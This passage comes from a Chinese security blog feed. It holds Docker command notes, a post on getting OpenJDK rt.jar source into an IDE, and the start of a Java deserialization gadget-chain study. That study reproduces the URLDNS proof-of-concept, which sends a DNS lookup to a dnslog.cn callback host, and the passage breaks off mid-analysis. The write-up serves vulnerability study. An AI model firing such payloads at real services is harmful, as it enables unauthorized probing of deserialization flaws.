href="#container-gt-image" class="headerlink" title="container-&gt;image"></a>container-&gt;image</h2><p>将容器保存为镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit [OPTIONS] CONTAINERID [REPO:VERSION]</span><br></pre></td></tr></table></figure><p>OPTIONS:</p><ul><li>-m: info</li><li>-a: author</li></ul><h3 id="container-gt-tar"><a href="#container-gt-tar" class="headerlink" title="container-&gt;tar"></a>container-&gt;tar</h3><p>将容器保存为tar文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export -o target.tar [ContainerID]</span><br></pre></td></tr></table></figure><h3 id="images-lt-gt-tar"><a href="#images-lt-gt-tar" class="headerlink" title="images&lt;-&gt;tar"></a>images&lt;-&gt;tar</h3><h4 id="images-lt-tar"><a href="#images-lt-tar" class="headerlink" title="images&lt;-tar"></a>images&lt;-tar</h4><p>load：将tar加载为image</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i target.tar</span><br></pre></td></tr></table></figure><p>加载之后为同名image</p><h4 id="image-gt-tar"><a href="#image-gt-tar" class="headerlink" title="image-&gt; tar"></a>image-&gt; tar</h4><p>save：将image保存为tar文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o target.tar ImageID</span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210930213709652.png" alt="image-20210930213709652"></p><h1 id="额外的备忘命令"><a href="#额外的备忘命令" class="headerlink" title="额外的备忘命令"></a>额外的备忘命令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看当前运行的容器</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看所有容器，包括停止的</span></span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看最新创建的容器，只列出最后创建的</span></span><br><span class="line">docker ps -l</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看网络端口</span></span><br><span class="line">docker port [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器内部的标准输出</span></span><br><span class="line">docker logs [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器内部运行的进程</span></span><br><span class="line">docker top [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息</span></span><br><span class="line">docker inspect [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除指定镜像</span></span><br><span class="line">docker rmi image_id</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除容器，删除容器时，容器必须是停止状态</span></span><br><span class="line">docker rm [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除所有的容器</span></span><br><span class="line">docker rm $(docker ps -aq)</span><br><span class="line"></span><br><span class="line">--restart=always 容器启动时重新启动</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一步到位</span></span><br><span class="line">docker run -it nginx:latest /bin/bash</span><br></pre></td></tr></table></figure><h1 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h1><p>   容器之间数据共享的技术，将容器内部的目录，挂载到宿主机上</p><h2 id="命令挂载"><a href="#命令挂载" class="headerlink" title="命令挂载"></a>命令挂载</h2><p><code>-v 主机目录:容器目录</code></p><p>数据映射</p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>docker的构建文件，本质为命令脚本</p><p>镜像多层，命令多行</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -f Dockerfile -t 镜像名:版本 .</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>RUN</strong></p><p>docker build时候执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">RUN yum -y install wget \</span><br><span class="line">    &amp;&amp; wget -O redis.tar.gz "http://download.redis.io/releases/redis-5.0.3.tar.gz" \</span><br><span class="line">    &amp;&amp; tar -xvf redis.tar.gz</span><br></pre></td></tr></table></figure><p><strong>CMD</strong>  docker run 时执行 </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"ls"</span>,<span class="string">"-a"</span>]</span></span><br><span class="line">&amp;&amp; 拼接</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://yeasy.gitbook.io/docker_practice/" target="_blank" rel="noopener">Docker-入门到实战</a></p><p><a href="https://segmentfault.com/a/1190000017151019" target="_blank" rel="noopener">MacOS Docker安装和使用</a></p><p><a href="https://www.runoob.com/docker/docker-command-manual.html" target="_blank" rel="noopener">Docker命令大全</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;欲穷千里目，更上一层楼。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在调试漏洞的过程中会密切地和Docker打交道，总结一下Docker的操作。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="https://fynch3r.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Docker" scheme="https://fynch3r.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>记一次对线rt.jar</title>
    <link href="https://fynch3r.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/"/>
    <id>https://fynch3r.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/</id>
    <published>2021-05-13T06:39:35.000Z</published>
    <updated>2021-05-25T13:20:52.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>独立三边静，轻生一剑知。</p></blockquote><p>记录一次对线rt.jar的经历。</p><a id="more"></a><h1 id="过程全记录"><a href="#过程全记录" class="headerlink" title="过程全记录"></a>过程全记录</h1><p>前一阵在复习CC链的时候，想着从PoC来逆向分析ysoserial师傅们的挖掘思路。</p><p>LazyMap函数的get函数很有挖掘潜力，所以我需要找哪些类调用了get方法。</p><p>已知答案是AnnotationInvocationHandler的invoke函数调用了get函数，可以执行下去。</p><p>现在我想用IDEA搜索一下，但是无奈没有找到。 </p><p>发现这个类属于sun.reflect.annotation包，位于rt.jar中，主动去搜索这个类你是可以看到的。</p><p><strong>IDEA可以反编译出来rt.jar的源码，但是不会帮你进去搜索代码细节，因为它没有源码</strong></p><p>直接去翻$JAVA_HOME，src.zip里面是jdk源码，但是并没有sun包。。</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513153049164.png" alt="image-20210513153049164"></p><p>搜索资料，我发现sun是oracle选择闭源的几个包之一。</p><p>Oracle选择性闭源？无奈又好笑，这能忍？</p><p>如何拿到rt.jar的源码，火速学习了一波。</p><p>所以我想着先去搞到openJDK7的源码。</p><p>搜了一波，发现<a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">http://hg.openjdk.java.net/</a>可以搞到源码，网速感人，要有耐心。。。</p><p>以我自己的7u21为例子：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150521166.png" alt="image-20210513150521166"></p><p>点击jdk7u-jdk，进去之后点击browse可以看内容</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150614447.png" alt="image-20210513150614447"></p><p>也可以不废话，直接点击zip下载</p><p>然后就拿到了一个zip解压：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150829266.png" alt="image-20210513150829266"></p><p>然后依次进入src-share-classes，看到了sun：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150912940.png" alt="image-20210513150912940"></p><p>也就是说，IDEA无法帮我们搜索的内容，我们现在可以自己添加进去了。</p><p>如何关联？</p><p>来到Project Structure - SKDs，把我们的源码的classes添加进去就可以了</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513151529264.png" alt="image-20210513151529264"></p><p>这次再搜索一下，直接find in path 搜索path</p><p>就可以看到了：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513151800556.png" alt="image-20210513151800556"></p><p>翻出了JD-GUI，比较一下。</p><p>我是直接来到$JAVA_HOME，进入jre/lib，这些东西会参与java-runtime</p><p>啪的一下很快奥！</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513152337666.png" alt="image-20210513152337666"></p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513152445982.png" alt="image-20210513152445982"></p><p>不得不佩服西方老师傅门的耐心，漏洞在牛角尖上。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://my.oschina.net/u/2518341/blog/1931088" target="_blank" rel="noopener">获取openJDK源码</a></p><p><a href="https://www.jianshu.com/p/96334b23f4f0" target="_blank" rel="noopener">JDK（rt.jar）源码和IDE关联</a></p><p><a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">http://hg.openjdk.java.net/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;独立三边静，轻生一剑知。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;记录一次对线rt.jar的经历。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java代码审计" scheme="https://fynch3r.github.io/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="实战记录" scheme="https://fynch3r.github.io/tags/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化利用链补全计划</title>
    <link href="https://fynch3r.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/"/>
    <id>https://fynch3r.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/</id>
    <published>2021-05-11T08:19:57.000Z</published>
    <updated>2021-12-07T02:37:54.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>温故而知新。</p></blockquote><p>站在巨人们的肩膀上，总结Java反序列化漏洞利用链，会持续更新。</p><p>同步项目：<a href="https://github.com/fynch3r/Gadgets" target="_blank" rel="noopener">Gadgets</a>     </p><a id="more"></a><h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>Java反序列化RCE三要素：<strong>readobject反序列化利用点 + 利用链 + RCE触发点</strong>。</p><p>审计maven仓库里面的jar包时，记得先拿到源码：</p><ul><li>点右上角download source </li><li>下载pom.xml里面声明的依赖jars：mvn dependency:resolve -Dclassifier=sources</li><li>JD-GUI </li><li>…</li></ul><h1 id="readObject源码分析"><a href="#readObject源码分析" class="headerlink" title="readObject源码分析"></a>readObject源码分析</h1><p>梦开始的地方。</p><p>正常使用反序列化，就会执行java.io.ObjectInputStream类中的readObejct方法。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511172731640.png" alt="image-20210511172731640"></p><p><strong>重点分析readObject0方法，它是核心方法。</strong>跟进去看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511173117069.png" alt="image-20210511173117069"></p><p>这里最重要的是进行了对象类型的选择，根据不同类型执行操作。</p><p>这里会先执行readOrdinaryObject方法，unshared是false。</p><p>进去看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511174136473.png" alt="image-20210511174136473"></p><p>看到点眉目了，<strong>readSerialData其实才是真正反序列化对象</strong>，进入readSerialData函数看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511192758582.png" alt="image-20210511192758582"></p><p>到这里，可以理清整个过程的关键步骤了。</p><p>在readSerialData中比较关键的是这个判断条件：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511175925746.png" alt="image-20210511175925746"></p><p>其中slotDesc.hasReadObjectMethod()获取的是readObjectMethod这个属性，<strong>如果反序列化的类没有重写readobject()，那么readObjectMethod这个属性就是空</strong>，如果这个类重写了readobject()，就会执行readObject()方法。</p><p>所以这也就是为什么，挖掘这类漏洞，上来第一件事就是要：<strong>找到哪些类有重写readObject()方法</strong>。</p><p><strong>2021.5.24更新</strong></p><p>最近发现有个神奇的方法<code>defaultReadObject</code></p><p>他的javadoc如下：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524155157492.png" alt="image-20210524155157492"></p><p>前面写到：</p><blockquote><p>读取非静态和非transient修饰的属性，并且只能被readObject方法调用</p></blockquote><p>懵懵的，写个demo实验一下：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524155558480.png" alt="image-20210524155558480"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524155522930.png" alt="image-20210524155522930"></p><p>会输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello，world！</span><br></pre></td></tr></table></figure><p>可以看到，Example类自己实现了readObject方法，并且在它内部还有一个<code>defaultReadObject</code>方法。</p><p>我们把它删掉会怎样？</p><p>答：这次输出是null，也就是s属性没有被序列化出来</p><p>所以<code>defaultReadObject</code>的作用就是执行流中对象默认的readObject方法，将对象的field反序列化出来。</p><p>还发现一个细节，为什么defaultReadObject的参数是一个ObjectInputStream参数？</p><p>看下图，是因为如果一个类自己实现了readObject方法，内部机制会invoke这个方法，参数就是当前流。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524160113446.png" alt="image-20210524160113446"></p><p>一句话总结，<code>defaultReadObject</code>方法一般用于自己实现的readObject方法中，需要一个流对象作为参数。</p><p>用来执行流中对象默认的readObject方法，将对象反序列化出来。</p><p>如果我们自定义序列化过程仅仅调用了这个方法而没有任何额外的操作，这其实和默认的序列化过程没任何区别。</p><p>多说几句：</p><p>有了defaultReadObject方法之后，就可以用户自主控制反序列化过程了。</p><p>比如说一个字段是加密的，我们可以在readObject方法中先调用defaultReadObject方法来将其他字段来正常反序列化出来，再在最后执行加密字段的追加append。</p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><blockquote><p>readobject反序列化利用点 + DNS查询，主要用来确认反序列化漏洞利用点的存在。</p></blockquote><p>最适合新手分析的反序列化链。ysoserial的一部分。</p><p>只依赖原生类，没有jdk版本限制。</p><p>dnslog平台可以选择：<a href="http://www.dnslog.cn/" target="_blank" rel="noopener">DNSLog.cn</a>，<a href="http://ceye.io" target="_blank" rel="noopener">ceye</a>，我选择了DNSLog。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>jdk版本：jdk8u162，网上PoC很多，这里用<a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">lalajun</a>师傅的为例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://oh6pfs.dnslog.cn"</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      </span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">      </span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功触发dns查询记录：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511165114468.png" alt="image-20210511165114468"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>三要素：HashMap / URL / HashCode</p><p>大体流程：</p><ol><li>new一个HashMap对象，key-value对为URL-String类型，key设置为我们的dnslog的地址</li><li>暴力反射，将URL类的hashCode字段改为public，默认是private</li><li>将url对象的hashCode字段随便改成一个值</li><li>将url对象放入HashMap中作为key，value也随便写一个</li><li>将f对象的hashCode字段改为-1，<strong>触发漏洞</strong></li></ol><p>最终的payload结构是 一个HashMap，里面包含了 一个修改了hashCode为-1的URL类对象。</p><p><strong>由于HashMap类自己有实现readObject方法，那么在反序列化过程中就会执行他自己的readObject。</strong></p><h3 id="搞懂HashMap"><a href="#搞懂HashMap" class="headerlink" title="搞懂HashMap"></a>搞懂HashMap</h3><blockquote><p><strong>HashMap 可以看作是一个链表散列的数据结构 , 也就是数组和链表的结合体.</strong></p></blockquote><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511193717145.png" alt="image-20210511193717145"></p><p>对于主干来说，当要存放一个entry的时候，步骤如下：</p><ol><li>计算key的hash：hash(k)</li><li>通过hash(k)映射到有限的数组a的位置i</li><li>在a[i]的位置存入value</li></ol><p>自然就会想到，<strong>如果哈希冲突了怎么办？</strong>HashMap对于不同的元素，如果hash值相同，会采用链表指针的方式来挂在后面。</p><blockquote><p><strong>HashMap的主干是一个Entry数组</strong>，主干数组的长度一定是2的次幂。</p><p>Entry是HashMap的基本组成单元，每一个Entry包含一个key-value键值对。（其实所谓Map其实就是保存了两个对象之间的映射关系的一种集合）</p></blockquote><p>看源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//jdk7</span></span><br><span class="line"><span class="keyword">transient</span> Entry&lt;K,V&gt;[] table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Entry是HashMap中的一个静态内部类。</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> K key;</span><br><span class="line">  V value;</span><br><span class="line">  Entry&lt;K,V&gt; next;<span class="comment">//存储指向下一个Entry的引用，单链表结构</span></span><br><span class="line">  <span class="keyword">int</span> hash;<span class="comment">//对key进行hash运算后得到的值，存储在Entry中，避免重复计算</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Creates new entry.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  Entry(<span class="keyword">int</span> h, K k, V v, Entry&lt;K,V&gt; n) &#123;</span><br><span class="line">    value = v;</span><br><span class="line">    next = n;</span><br><span class="line">    key = k;</span><br><span class="line">    hash = h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看图：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511195908151.png" alt="image-20210511195908151"></p><h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><p>看源码（跳过一些初始化操作）：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201023679.png" alt="image-20210511201023679"></p><p>putVal是向Map存放Entry的操作，在放入时会计算<strong>key的hash</strong>作为转化为数组位置<strong>i</strong>的映射依据。</p><p><strong>DNS查询正是在计算URL类的对象的hash的过程中触发的</strong>，即<strong>hash(key)</strong>。</p><p>看hash()方法源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201250404.png" alt="image-20210511201250404"></p><p>不同对象的hash计算方法是在各自的类中实现的，如果传入的key是一个URL对象，这里key.hashCode()就会调用URL类中的hashCode方法：java.net.URL#hashCode。</p><p>java.net.URL#hashCode 源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201521952.png" alt="image-20210511201521952"></p><p>仔细看，用到了两个field：</p><blockquote><p><strong>transient</strong> URLStreamHandler handler;  // handler是一个transient临时类型，它不会被反序列化（但之后会用到）</p><p><strong>private</strong> <strong>int</strong> hashCode = -1;   //hashCode是private类型，需要手动开放控制权才可以修改。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//如果hashCode不为-1，直接返回hashCode的值</span></span><br><span class="line">  <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line"><span class="comment">//如果hashCode为-1，直接计算handler的hashcode，并返回</span></span><br><span class="line">  hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那就继续看handler所属的类：URLStreamHandler</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511204935728.png" alt="image-20210511204935728"></p><p>getHostAddress也是限制了IP地址不会解析：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511205231393.png" alt="image-20210511205231393"></p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511231600583.png" alt="image-20210511231600583" style="zoom:50%;"><p>这里面必须提一下上面的hostAddress参数，<strong>如果 Host 字段为一个域名 , 且我们之前解析过这个域名 , 那么程序会将解析后的 IP 地址缓存到 hostAddress 参数中 , 当我们再次请求时 , 由于 hostAddress 已有值 , 就不会走完剩下的 POP Chain 